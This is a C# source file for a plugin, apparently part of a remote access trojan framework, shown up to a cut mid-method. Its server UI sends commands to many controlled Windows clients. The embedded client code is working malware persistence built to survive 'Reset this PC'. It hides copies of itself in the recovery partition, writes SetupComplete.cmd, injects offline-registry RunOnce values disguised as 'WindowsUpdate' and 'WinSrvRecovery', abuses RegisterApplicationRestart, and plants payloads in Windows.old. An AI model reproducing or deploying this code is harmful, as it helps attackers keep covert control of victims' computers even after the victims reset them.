using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using Microsoft.Win32;
using WpfApp.Plugins;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class ResetSurvivalPlugin : IServerPlugin, IMultiClientPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, PluginContext> _clientContexts = new();
        private ResetSurvivalMultiUI _sharedUI;
        private readonly object _uiLock = new();

        public string PluginId => "resetsurvival";
        public string DisplayName => "Reset Survival";
        public string Version => "1.0.0";
        public string Description => "Survive Windows Reset via recovery partition, offline registry, SetupComplete, and phantom persistence.";

        private const byte OP_QUERY_INFO = 0x01;
        private const byte OP_INSTALL_RECOVERY_OEM = 0x02;
        private const byte OP_INSTALL_SETUP_COMPLETE = 0x03;
        private const byte OP_INSTALL_OFFLINE_REG = 0x04;
        private const byte OP_INSTALL_RUNONCE_LOOP = 0x05;
        private const byte OP_INSTALL_PHANTOM = 0x06;
        private const byte OP_INSTALL_WINDOWS_OLD = 0x07;
        private const byte OP_REMOVE_RECOVERY_OEM = 0x10;
        private const byte OP_REMOVE_SETUP_COMPLETE = 0x11;
        private const byte OP_REMOVE_OFFLINE_REG = 0x12;
        private const byte OP_REMOVE_RUNONCE_LOOP = 0x13;
        private const byte OP_REMOVE_PHANTOM = 0x14;
        private const byte OP_REMOVE_WINDOWS_OLD = 0x15;
        private const byte OP_QUERY_STATUS = 0x20;

        private const byte CLIENT_READY = 0xFE;
        private const byte CLIENT_ACK = 0x01;
        private const byte CLIENT_ERROR = 0x02;
        private const byte CLIENT_INFO_RESPONSE = 0x03;
        private const byte CLIENT_STATUS_RESPONSE = 0x04;

        public Task Initialize(PluginHost host)
        {
            _host = host;
            _host.Log("[RESET SURVIVAL] Plugin initialized");
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            lock (_uiLock)
            {
                _sharedUI?.Dispose();
                _sharedUI = null;
            }
            _clientContexts.Clear();
            return Task.CompletedTask;
        }

        public void AddClient(string clientId, PluginContext context)
        {
            _clientContexts[clientId] = context;
            lock (_uiLock)
            {
                _sharedUI?.OnClientAdded(clientId);
            }
        }

        public void RemoveClient(string clientId)
        {
            if (_clientContexts.TryRemove(clientId, out _))
            {
                lock (_uiLock)
                {
                    _sharedUI?.OnClientRemoved(clientId);
                }
            }
        }

        public void RemoveAllClients()
        {
            var ids = _clientContexts.Keys.ToList();
            _clientContexts.Clear();
            lock (_uiLock)
            {
                foreach (var id in ids)
                    _sharedUI?.OnClientRemoved(id);
            }
        }

        public List<string> GetManagedClientIds() => _clientContexts.Keys.ToList();

        public UserControl CreateSharedUI()
        {
            lock (_uiLock)
            {
                if (_sharedUI != null) return _sharedUI;
                _sharedUI = new ResetSurvivalMultiUI(this);
                foreach (var clientId in _clientContexts.Keys)
                    _sharedUI.OnClientAdded(clientId);
                return _sharedUI;
            }
        }

        public UserControl CreateUI(PluginContext context) => CreateSharedUI();

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            ResetSurvivalMultiUI ui;
            lock (_uiLock) { ui = _sharedUI; }
            if (ui == null) return Task.CompletedTask;

            byte indicator = data[0];
            switch (indicator)
            {
                case CLIENT_READY: ui.OnClientReady(clientId); break;
                case CLIENT_ACK:
                    if (data.Length >= 2) ui.OnCommandAck(clientId, data[1]);
                    break;
                case CLIENT_ERROR:
                    if (data.Length >= 2)
                    {
                        string error = data.Length > 2 ? Encoding.UTF8.GetString(data, 2, data.Length - 2) : "Unknown";
                        ui.OnCommandError(clientId, data[1], error);
                    }
                    break;
                case CLIENT_INFO_RESPONSE:
                    if (data.Length > 1)
                        ui.OnInfoReceived(clientId, Encoding.UTF8.GetString(data, 1, data.Length - 1));
                    break;
                case CLIENT_STATUS_RESPONSE:
                    if (data.Length > 1)
                        ui.OnStatusReceived(clientId, Encoding.UTF8.GetString(data, 1, data.Length - 1));
                    break;
            }
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            RemoveClient(clientId);
            return Task.CompletedTask;
        }

        public void SendCommand(string clientId, byte opcode, byte[] payload = null)
        {
            if (!_clientContexts.ContainsKey(clientId)) return;
            int payloadLen = payload?.Length ?? 0;
            byte[] data = new byte[1 + payloadLen];
            data[0] = opcode;
            if (payload != null && payload.Length > 0)
                Buffer.BlockCopy(payload, 0, data, 1, payload.Length);
            _host.SendPluginDataToClient(clientId, PluginId, data);
        }

        public void SendToAll(byte opcode, byte[] payload = null)
        {
            foreach (var clientId in _clientContexts.Keys.ToList())
                SendCommand(clientId, opcode, payload);
        }

        public string GetClientCode()
        {
            string code = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace ClientPlugin_resetsurvival
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private Func<Task<byte[]>> _receive;
        private CancellationTokenSource _cts = new CancellationTokenSource();
        private Thread _phantomThread;
        private bool _phantomActive = false;

        [DllImport(""kernel32.dll"")]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport(""kernel32.dll"", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
        [DllImport(""kernel32.dll"", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
        [DllImport(""advapi32.dll"", SetLastError = true)]
        private static extern int RegLoadKey(IntPtr hKey, string lpSubKey, string lpFile);
        [DllImport(""advapi32.dll"", SetLastError = true)]
        private static extern bool RegUnLoadKey(IntPtr hKey, string lpSubKey);
        [DllImport(""advapi32.dll"", SetLastError = true)]
        private static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);
        [DllImport(""advapi32.dll"", SetLastError = true)]
        private static extern int RegSetValueEx(IntPtr hKey, string lpValueName, int Reserved, int dwType, byte[] lpData, int cbData);
        [DllImport(""advapi32.dll"", SetLastError = true)]
        private static extern int RegDeleteValue(IntPtr hKey, string lpValueName);
        [DllImport(""advapi32.dll"", SetLastError = true)]
        private static extern int RegCloseKey(IntPtr hKey);
        [DllImport(""kernel32.dll"")]
        private static extern uint RegisterApplicationRestart(string pwzCommandline, uint dwFlags);
        [DllImport(""kernel32.dll"")]
        private static extern uint SetProcessShutdownParameters(uint dwLevel, uint dwFlags);

        public async Task Run(Func<byte[], Task> send, Func<Task<byte[]>> receive)
        {
            _send = send;
            _receive = receive;
            await _send(new byte[] { 0xFE });
            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] data = await _receive();
                    if (data == null || data.Length == 0) break;
                    byte opcode = data[0];
                    byte[] response = null;
                    try
                    {
                        switch (opcode)
                        {
                            case 0x01: response = BuildInfoResponse(); break;
                            case 0x02: InstallRecoveryOEM(); response = Ack(0x02); break;
                            case 0x03: InstallSetupComplete(); response = Ack(0x03); break;
                            case 0x04: InstallOfflineRegistry(); response = Ack(0x04); break;
                            case 0x05: InstallRunOnceLoop(); response = Ack(0x05); break;
                            case 0x06: InstallPhantom(); response = Ack(0x06); break;
                            case 0x07: InstallWindowsOld(); response = Ack(0x07); break;
                            case 0x10: RemoveRecoveryOEM(); response = Ack(0x10); break;
                            case 0x11: RemoveSetupComplete(); response = Ack(0x11); break;
                            case 0x12: RemoveOfflineRegistry(); response = Ack(0x12); break;
                            case 0x13: RemoveRunOnceLoop(); response = Ack(0x13); break;
                            case 0x14: RemovePhantom(); response = Ack(0x14); break;
                            case 0x15: RemoveWindowsOld(); response = Ack(0x15); break;
                            case 0x20: response = BuildStatusResponse(); break;
                            case 0xFF: _cts.Cancel(); break;
                        }
                    }
                    catch (Exception ex)
                    {
                        response = SendError(opcode, ex.Message);
                    }
                    if (response != null) { try { await _send(response); } catch { } }
                }
            }
            catch (OperationCanceledException) { }
        }

        private byte[] SendError(byte opcode, string message)
        {
            byte[] err = Encoding.UTF8.GetBytes(message);
            byte[] resp = new byte[2 + err.Length];
            resp[0] = 0x02; resp[1] = opcode;
            Buffer.BlockCopy(err, 0, resp, 2, err.Length);
            return resp;
        }

        private byte[] Ack(byte op)
        {
            return new byte[] { 0x01, op };
        }

        private string GetExePath()
        {
            return Process.GetCurrentProcess().MainModule.FileName;
        }
        private string GetExeName()
        {
            return Path.GetFileName(GetExePath());
        }

        private bool IsAdmin
        {
            get
            {
                try { return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator); }
                catch { return false; }
            }
        }

        // ==================== 1. Recovery OEM ====================
        private void InstallRecoveryOEM()
        {
            string oemDir = @""C:\Recovery\OEM"";
            Directory.CreateDirectory(oemDir);
            string dest = Path.Combine(oemDir, GetExeName());
            File.Copy(GetExePath(), dest, true);
            File.SetAttributes(dest, FileAttributes.Hidden | FileAttributes.System);
        }

        private void RemoveRecoveryOEM()
        {
            string path = Path.Combine(@""C:\Recovery\OEM"", GetExeName());
            if (File.Exists(path)) File.Delete(path);
        }

        // ==================== 2. SetupComplete.cmd ====================
        private void InstallSetupComplete()
        {
            string oemDir = @""C:\Recovery\OEM"";
            Directory.CreateDirectory(oemDir);
            string oemPayload = Path.Combine(oemDir, GetExeName());
            File.Copy(GetExePath(), oemPayload, true);
            string setupDir = @""C:\Windows\Setup\Scripts"";
            Directory.CreateDirectory(setupDir);
            string script = ""@echo off\nstart \""\"" \"""" + oemPayload + ""\"""";
            File.WriteAllText(Path.Combine(setupDir, ""SetupComplete.cmd""), script);
        }

        private void RemoveSetupComplete()
        {
            string path = @""C:\Windows\Setup\Scripts\SetupComplete.cmd"";
            if (File.Exists(path)) File.Delete(path);
        }

        // ==================== 3. Offline Registry ====================
        private void InstallOfflineRegistry()
        {
            if (!IsAdmin) throw new UnauthorizedAccessException(""Admin required for offline registry."");
            string windir = Environment.GetEnvironmentVariable(""SystemRoot"") ?? ""C:\\Windows"";
            string softwareHive = windir + ""\\System32\\config\\SOFTWARE"";
            if (!File.Exists(softwareHive)) throw new Exception(""SOFTWARE hive not found: "" + softwareHive);
            IntPtr hklm = new IntPtr(-2147483646);
            int ret = RegLoadKey(hklm, ""ResetSurvival_Temp"", softwareHive);
            if (ret != 0) throw new Exception(""RegLoadKey failed: "" + ret);
            try
            {
                IntPtr hKey;
                ret = RegOpenKeyEx(hklm, ""ResetSurvival_Temp\\Microsoft\\Windows\\CurrentVersion\\RunOnce"", 0, 0xF003F, out hKey);
                if (ret == 0 && hKey != IntPtr.Zero)
                {
                    byte[] val = Encoding.Unicode.GetBytes(GetExePath() + ""\0"");
                    RegSetValueEx(hKey, ""WindowsUpdate"", 0, 1, val, val.Length);
                    RegCloseKey(hKey);
                }
            }
            finally
            {
                RegUnLoadKey(hklm, ""ResetSurvival_Temp"");
            }
        }

        private void RemoveOfflineRegistry()
        {
            try
            {
                string windir = Environment.GetEnvironmentVariable(""SystemRoot"") ?? ""C:\\Windows"";
                string softwareHive = windir + ""\\System32\\config\\SOFTWARE"";
                if (!File.Exists(softwareHive)) return;
                IntPtr hklm = new IntPtr(-2147483646);
                int ret = RegLoadKey(hklm, ""ResetSurvival_Temp"", softwareHive);
                if (ret != 0) return;
                try
                {
                    IntPtr hKey;
                    ret = RegOpenKeyEx(hklm, ""ResetSurvival_Temp\\Microsoft\\Windows\\CurrentVersion\\RunOnce"", 0, 0xF003F, out hKey);
                    if (ret == 0 && hKey != IntPtr.Zero)
                    {
                        try { RegDeleteValue(hKey, ""WindowsUpdate""); } catch { }
                        finally { RegCloseKey(hKey); }
                    }
                }
                finally { RegUnLoadKey(hklm, ""ResetSurvival_Temp""); }
            }
            catch { }
        }

        // ==================== 4. Self-Reinstalling RunOnce ====================
        private void InstallRunOnceLoop()
        {
            using (var key = Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"", true))
            {
                if (key != null)
                    key.SetValue(""WinSrvRecovery"", GetExePath());
            }
        }

        private void RemoveRunOnceLoop()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"", true))
                {
                    if (key != null) key.DeleteValue(""WinSrvRecovery"", false);
                }
            }
            catch { }
        }

        // ==================== 5. Phantom Persistence ====================
        private void InstallPhantom()
        {
            if (_phantomActive) throw new Exception(""Phantom already active"");
            uint ret = RegisterApplicationRestart(null, 0);
            if (ret != 0) throw new Exception(""RegisterApplicationRestart failed: "" + ret);
            SetProcessShutdownParameters(0x4FFu, 0);
            _phantomActive = true;
            _phantomThread = new Thread(PhantomMessageLoop);
            _phantomThread.IsBackground = true;
            _phantomThread.SetApartmentState(ApartmentState.STA);
            _phantomThread.Start();
        }

        private void PhantomMessageLoop()
        {
            try
            {
                while (_phantomActive) { Thread.Sleep(500); }
            }
            catch { }
        }

        private void RemovePhantom()
        {
            _phantomActive = false;
            _phantomThread = null;
            RegisterApplicationRestart(null, 0);
        }

        // ==================== 6. Windows.old ====================
        private void InstallWindowsOld()
        {
            try
            {
                string winOld = @""C:\Windows.old"";
                if (!Directory.Exists(winOld)) throw new Exception(""Windows.old not found"");
                string[] dirs = new[] {
                    winOld + ""\\Users\\"" + Environment.UserName + ""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"",
                    winOld + ""\\Windows\\Setup\\Scripts""
                };
                foreach (string dir in dirs)
                {
                    Directory.CreateDirectory(dir);
                    string dest = Path.Combine(dir, GetExeName());
                    File.Copy(GetExePath(), dest, true);
                }
            }
            catch { throw; }
        }

        private void RemoveWindowsOld()
        {
            try
            {
                string winOld = @""C:\Windows.old"";
                if (!Directory.Exists(winOld)) return;
                string[] paths = new[] {
                    winOld + ""\\Users\\"" + Environment.UserName + ""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"" + GetExeName(),
                    winOld + ""\\Windows\\Setup\\Scripts\\"" + GetExeName()
                };
                foreach (string p in paths)
                    if (File.Exists(p)) File.Delete(p);
            }
            catch { }
        }

        // ==================== Info / Status ====================
        private byte[] BuildInfoResponse()
        {
            var sb = new StringBuilder();
            sb.AppendLine(""ExePath="" + GetExePath());
            sb.AppendLine(""PID="" + Process.GetCurrentProcess().Id);
            sb.AppendLine(""User="" + Environment.UserName);
            sb.AppendLine(""Machine="" + Environment.MachineName);
            sb.AppendLine(""IsAdmin="" + IsAdmin);
            sb.AppendLine(""OSVersion="" + Environment.OSVersion);
            sb.AppendLine(""SystemDir="" + Environment.SystemDirectory);
            sb.AppendLine(""WinDir="" + Environment.GetEnvironmentVariable(""SystemRoot""));
            byte[] info = Encoding.UTF8.GetBytes(sb.ToString());
            byte[] result = new byte[1 + info.Length];
            result[0] = 0x03; Buffer.BlockCopy(info, 0, result, 1, info.Length);
            return result;
        }

        private byte[] BuildStatusResponse()
        {
            var sb = new StringBuilder();

            bool oemExists = File.Exists(Path.Combine(@""C:\Recovery\OEM"", GetExeName()));
            bool setupCompleteExists = File.Exists(@""C:\Windows\Setup\Scripts\SetupComplete.cmd"");
            bool winOldExists = false;
            try
            {
                string winOld = @""C:\Windows.old"";
                if (Directory.Exists(winOld))
                {
                    string p = winOld + ""\\Users\\"" + Environment.UserName + ""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"" + GetExeName();
                    winOldExists = File.Exists(p);
                }
            }
            catch { }

            bool runOnceInstalled = false;
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@""SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"", false))
                {
                    if (key != null && key.GetValue(""WinSrvRecovery"") != null)
                        runOnceInstalled = true;
                }
            }
            catch { }

            bool offlineRegExists = false;
            try
            {
                string windir = Environment.GetEnvironmentVariable(""SystemRoot"") ?? ""C:\\Windows"";
                string softwareHive = windir + ""\\System32\\config\\SOFTWARE"";
                if (File.Exists(softwareHive))
                {
                    IntPtr hklm = new IntPtr(-2147483646);
                    int ret = RegLoadKey(hklm, ""ResetSurvival_Temp"", softwareHive);
                    if (ret == 0)
                    {
                        try
                        {
                            IntPtr hKey;
                            ret = RegOpenKeyEx(hklm, ""ResetSurvival_Temp\\Microsoft\\Windows\\CurrentVersion\\RunOnce"", 0, 0xF003F, out hKey);
                            if (ret == 0 && hKey != IntPtr.Zero)
                            {
                                offlineRegExists = true;
                                RegCloseKey(hKey);
                            }
                        }
                        finally { RegUnLoadKey(hklm, ""ResetSurvival_Temp""); }
                    }
                }
            }
            catch { }

            sb.AppendLine(""RecoveryOEM="" + (oemExists ? ""YES"" : ""NO""));
            sb.AppendLine(""SetupComplete="" + (setupCompleteExists ? ""YES"" : ""NO""));
            sb.AppendLine(""OfflineReg="" + (offlineRegExists ? ""YES"" : ""NO""));
            sb.AppendLine(""RunOnceLoop="" + (runOnceInstalled ? ""YES"" : ""NO""));
            sb.AppendLine(""Phantom="" + (_phantomActive ? ""YES"" : ""NO""));
            sb.AppendLine(""WindowsOld="" + (winOldExists ? ""YES"" : ""NO""));

            byte[] status = Encoding.UTF8.GetBytes(sb.ToString());
            byte[] result = new byte[1 + status.Length];
            result[0] = 0x04; Buffer.BlockCopy(status, 0, result, 1, status.Length);
            return result;
        }
    }
}
";
            try { File.WriteAllText(Path.Combine(Path.GetTempPath(), "client_gen.cs"), code); } catch { }
            return code;
        }

        public void Dispose()
        {
            lock (_uiLock)
            {
                _sharedUI?.Dispose();
                _sharedUI = null;
            }
            _clientContexts.Clear();
        }
    }

    [SupportedOSPlatform("windows")]
    public class ResetSurvivalClientRow : INotifyPropertyChanged
    {
        private string _state = "Waiting...";
        private string _oem = "-";
        private string _setupComplete = "-";
        private string _offlineReg = "-";
        private string _runOnce = "-";
        private string _phantom = "-";
        private string _winOld = "-";
        private string _lastResult = "";
        private bool _isSelected;
        private bool _isReady;

        public string ClientId { get; }
        public string ShortId => ClientId.Length > 16 ? ClientId.Substring(0, 16) + "..." : ClientId;
        public string State { get => _state; set { _state = value; Notify(nameof(State)); } }
        public string OEM { get => _oem; set { _oem = value; Notify(nameof(OEM)); } }
        public string SetupComplete { get => _setupComplete; set { _setupComplete = value; Notify(nameof(SetupComplete)); } }
        public string OfflineReg { get => _offlineReg; set { _offlineReg = value; Notify(nameof(OfflineReg)); } }
        public string RunOnce { get => _runOnce; set { _runOnce = value; Notify(nameof(RunOnce)); } }
        public string Phantom { get => _phantom; set { _phantom = value; Notify(nameof(Phantom)); } }
        public string WindowsOld { get => _winOld; set { _winOld = value; Notify(nameof(WindowsOld)); } }
        public string LastResult { get => _lastResult; set { _lastResult = value; Notify(nameof(LastResult)); } }
        public bool IsSelected { get => _isSelected; set { _isSelected = value; Notify(nameof(IsSelected)); } }
        public bool IsReady { get => _isReady; set { _isReady = value; Notify(nameof(IsReady)); Notify(nameof(State)); } }

        public ResetSurvivalClientRow(string clientId) { ClientId = clientId; }
        public event PropertyChangedEventHandler PropertyChanged;
        private void Notify(string prop) => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(prop));
    }

    [SupportedOSPlatform("windows")]
    public class ResetSurvivalMultiUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private Color BgColor => C("BackgroundColor");
        private Color SurfaceColor => C("SurfaceColor");
        private Color BorderColor => C("BorderColor");
        private Color TextColor => C("TextPrimaryColor");
        private Color TextDimColor => C("TextSecondaryColor");
        private Color PrimaryColor => C("PrimaryColor");
        private Color PrimaryHover => C("PrimaryHoverColor");
        private Color DangerColor => C("DangerColor");
        private Color DangerHover => C("DangerHoverColor");
        private Color SuccessColor => C("SuccessColor");
        private Color SuccessHover => C("SuccessHoverColor");
        private Color ButtonBgClr => C("ButtonBgColor");
        private Color ButtonBgHoverClr => C("ButtonBgHoverColor");

        private readonly ResetSurvivalPlugin _plugin;
        private readonly ObservableCollection<ResetSurvivalClientRow> _clients = new();
        private readonly TextBox _logTextBox;
        private readonly TextBlock _clientCountLabel;
        private readonly ListView _clientListView;
        private readonly List<Button> _commandButtons = new();
        private bool _selectAllState = true;

        public ResetSurvivalMultiUI(ResetSurvivalPlugin plugin)
        {
            _plugin = plugin;
            Background = new SolidColorBrush(BgColor);

            var mainGrid = new Grid();
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            mainGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(140) });

            var toolbar = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                BorderBrush = new SolidColorBrush(BorderColor),
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(12, 8, 12, 8)
            };
            _clientCountLabel = new TextBlock { Foreground = new SolidColorBrush(TextDimColor), FontSize = 12, VerticalAlignment = VerticalAlignment.Center };
            var toolbarPanel = new StackPanel { Orientation = Orientation.Horizontal };
            toolbarPanel.Children.Add(_clientCountLabel);
            toolbar.Child = toolbarPanel;
            Grid.SetRow(toolbar, 0);
            mainGrid.Children.Add(toolbar);

            var contentGrid = new Grid();
            contentGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });
            contentGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(320) });

            _clientListView = new ListView
            {
                Background = new SolidColorBrush(BgColor),
                BorderThickness = new Thickness(0),
                Foreground = new SolidColorBrush(TextColor),
                ItemsSource = _clients,
                Margin = new Thickness(8)
            };

            var itemStyle = new Style(typeof(ListViewItem));
            itemStyle.Setters.Add(new Setter(ListViewItem.BackgroundProperty, Brushes.Transparent));
            itemStyle.Setters.Add(new Setter(ListViewItem.ForegroundProperty, new SolidColorBrush(TextColor)));
            itemStyle.Setters.Add(new Setter(ListViewItem.BorderThicknessProperty, new Thickness(0)));
            itemStyle.Setters.Add(new Setter(ListViewItem.PaddingProperty, new Thickness(4, 2, 4, 2)));
            var ht = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            ht.Setters.Add(new Setter(ListViewItem.BackgroundProperty, new SolidColorBrush(C("SurfaceLightColor"))));
            itemStyle.Triggers.Add(ht);
            var st = new Trigger { Property = ListViewItem.IsSelectedProperty, Value = true };
            st.Setters.Add(new Setter(ListViewItem.BackgroundProperty, new SolidColorBrush(C("BorderColor"))));
            st.Setters.Add(new Setter(ListViewItem.ForegroundProperty, new SolidColorBrush(TextColor)));
            itemStyle.Triggers.Add(st);
            _clientListView.ItemContainerStyle = itemStyle;

            var gv = new GridView();
            gv.Columns.Add(MkCol("", "IsSelected", 30, true));
            gv.Columns.Add(MkCol("Client", "ShortId", 130));
            gv.Columns.Add(MkCol("State", "State", 85));
            gv.Columns.Add(MkCol("OEM", "OEM", 40));
            gv.Columns.Add(MkCol("Setup", "SetupComplete", 45));
            gv.Columns.Add(MkCol("OffReg", "OfflineReg", 45));
            gv.Columns.Add(MkCol("RunOnce", "RunOnce", 50));
            gv.Columns.Add(MkCol("Phantom", "Phantom", 50));
            gv.Columns.Add(MkCol("WinOld", "WindowsOld", 45));
            gv.Columns.Add(MkCol("Result", "LastResult", 180));
            _clientListView.View = gv;
            Grid.SetColumn(_clientListView, 0);
            contentGrid.Children.Add(_clientListView);

            var cs = new ScrollViewer { VerticalScrollBarVisibility = ScrollBarVisibility.Auto, Padding = new Thickness(12, 8, 12, 8) };
            var cp = new StackPanel();

            cp.Children.Add(SelRow());
            cp.Children.Add(Sep());
            cp.Children.Add(Hdr("Query"));
            var qr = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };
            AddBtn(qr, "Query Info", ButtonBgClr, ButtonBgHoverClr, 0x01);
            AddBtn(qr, "Query Status", ButtonBgClr, ButtonBgHoverClr, 0x20);
            var qa = MakeBtn("All Clients", ButtonBgClr, ButtonBgHoverClr);
            qa.Click += (s, e) => { _plugin.SendToAll(0x20); AppendLog("Querying all clients..."); };
            qr.Children.Add(qa);
            cp.Children.Add(qr);
            cp.Children.Add(Sep());

            cp.Children.Add(Hdr("Install Reset Survival"));
            var ir = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };
            AddBtn(ir, "OEM Dir", SuccessColor, SuccessHover, 0x02);
            AddBtn(ir, "SetupComplete", SuccessColor, SuccessHover, 0x03);
            AddBtn(ir, "Offline Reg", SuccessColor, SuccessHover, 0x04);
            AddBtn(ir, "RunOnce Loop", SuccessColor, SuccessHover, 0x05);
            AddBtn(ir, "Phantom", SuccessColor, SuccessHover, 0x06);
            AddBtn(ir, "Windows.old", SuccessColor, SuccessHover, 0x07);
            cp.Children.Add(ir);

            cp.Children.Add(Hdr("Remove Reset Survival"));
            var rr = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };
            AddBtn(rr, "OEM Dir", DangerColor, DangerHover, 0x10);
            AddBtn(rr, "SetupComplete", DangerColor, DangerHover, 0x11);
            AddBtn(rr, "Offline Reg", DangerColor, DangerHover, 0x12);
            AddBtn(rr, "RunOnce Loop", DangerColor, DangerHover, 0x13);
            AddBtn(rr, "Phantom", DangerColor, DangerHover, 0x14);
            AddBtn(rr, "Windows.old", DangerColor, DangerHover, 0x15);
            cp.Children.Add(rr);
            cp.Children.Add(Sep());

            cp.Children.Add(Hdr("Bulk"));
            var br = new WrapPanel { Margin = new Thickness(0, 0, 0, 8) };
            var ball = MakeBtn("Install All (Selected)", SuccessColor, SuccessHover);
            ball.Click += (s, e) =>
            {
                SendToSelected(0x02); SendToSelected(0x03); SendToSelected(0x05);
                AppendLog("Installing OEM + SetupComplete + RunOnce Loop on selected...");
            };
            br.Children.Add(ball);
            var rall = MakeBtn("Remove All (Selected)", DangerColor, DangerHover);
            rall.Click += (s, e) =>
            {
                if (MessageBox.Show("Remove ALL reset survival methods from selected clients?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes)
                { for (byte o = 0x10; o <= 0x15; o++) SendToSelected(o); AppendLog("Removing all methods from selected..."); }
            };
            br.Children.Add(rall);
            cp.Children.Add(br);
            cp.Children.Add(Sep());

            cp.Children.Add(Hdr("Method Descriptions"));
            var info = new TextBlock
            {
                Text = "OEM Dir: Copy to C:\\Recovery\\OEM (survives reset)\nSetupComplete: Script runs after Windows reset finishes\nOffline Reg: Mount SOFTWARE hive, inject RunOnce (Admin)\nRunOnce Loop: Self-reinstalling RunOnce via shutdown hook\nPhantom: RegisterApplicationRestart + WM_ENDSESSION hijack\nWindows.old: Place payload in C:\\Windows.old preserved paths",
                Foreground = new SolidColorBrush(TextDimColor),
                FontSize = 11, TextWrapping = TextWrapping.Wrap,
                Margin = new Thickness(0, 0, 0, 8), LineHeight = 18
            };
            cp.Children.Add(info);

            cs.Content = cp;
            var cb = new Border { BorderBrush = new SolidColorBrush(BorderColor), BorderThickness = new Thickness(1, 0, 0, 0), Child = cs };
            Grid.SetColumn(cb, 1);
            contentGrid.Children.Add(cb);
            Grid.SetRow(contentGrid, 1);
            mainGrid.Children.Add(contentGrid);

            var lb = new Border { Background = new SolidColorBrush(SurfaceColor), BorderBrush = new SolidColorBrush(BorderColor), BorderThickness = new Thickness(0, 1, 0, 0) };
            var lg = new Grid();
            lg.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            lg.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            lg.Children.Add(new TextBlock { Text = "Activity Log", FontSize = 11, FontWeight = FontWeights.SemiBold, Foreground = new SolidColorBrush(TextDimColor), Margin = new Thickness(12, 4, 12, 2) });
            _logTextBox = new TextBox
            {
                IsReadOnly = true, Background = new SolidColorBrush(SurfaceColor), Foreground = new SolidColorBrush(TextDimColor),
                BorderThickness = new Thickness(0), FontFamily = new FontFamily("Cascadia Mono, Consolas, monospace"),
                FontSize = 11, TextWrapping = TextWrapping.Wrap, VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                Padding = new Thickness(12, 0, 12, 6), CaretBrush = Brushes.Transparent
            };
            Grid.SetRow(_logTextBox, 1); lg.Children.Add(_logTextBox);
            lb.Child = lg; Grid.SetRow(lb, 2); mainGrid.Children.Add(lb);

            Content = mainGrid;
            AppendLog("Reset Survival Manager ready. Methods to survive Windows Reset this PC.");
        }

        private void AddBtn(WrapPanel p, string l, Color bg, Color h, byte op)
        {
            var b = MakeBtn(l, bg, h);
            b.Click += (s, e) => SendToSelected(op);
            p.Children.Add(b); _commandButtons.Add(b);
        }

        private void SendToSelected(byte op, byte[] pl = null)
        {
            var sel = _clients.Where(c => c.IsSelected && c.IsReady).ToList();
            if (sel.Count == 0) { AppendLog("No ready clients selected."); return; }
            foreach (var c in sel) _plugin.SendCommand(c.ClientId, op, pl);
            AppendLog($"Sent '{OpName(op)}' to {sel.Count} client(s).");
        }

        public void OnClientAdded(string id)
        {
            Dispatcher.BeginInvoke(() =>
            {
                if (_clients.Any(c => c.ClientId == id)) return;
                _clients.Add(new ResetSurvivalClientRow(id) { IsSelected = true });
                UpdateCount(); AppendLog($"Client added: {Short(id)}");
            });
        }

        public void OnClientRemoved(string id)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var r = _clients.FirstOrDefault(c => c.ClientId == id);
                if (r != null) { _clients.Remove(r); UpdateCount(); AppendLog($"Client removed: {Short(id)}"); }
            });
        }

        public void OnClientReady(string id)
        {
            Dispatcher.BeginInvoke(() =>
            {
